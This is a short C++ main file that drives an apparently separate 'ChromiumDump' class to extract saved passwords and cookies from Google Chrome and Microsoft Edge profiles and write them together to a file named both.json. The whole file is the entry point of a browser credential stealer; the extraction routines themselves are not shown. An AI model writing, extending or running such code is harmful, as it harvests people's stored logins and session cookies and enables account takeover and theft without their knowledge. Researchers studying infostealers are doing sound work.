#pragma once
#include "ChromiumDump.h"


int main() {
	BYTE* pbBinary = nullptr;
	free(pbBinary);

	ChromiumDump chrome = ChromiumDump::ChromiumDump();
	chrome.DumpPasswordData();
	chrome.DumpCookieData();

	ChromiumDump edge = chrome;
	edge.setBrowserDataPath(L"Microsoft\\Edge\\User Data");
	edge.setBrowserName(L"msedge.exe");
	edge.DumpPasswordData();
	edge.DumpCookieData();
	edge.WriteJSON(L"both.json");
	return 0;
}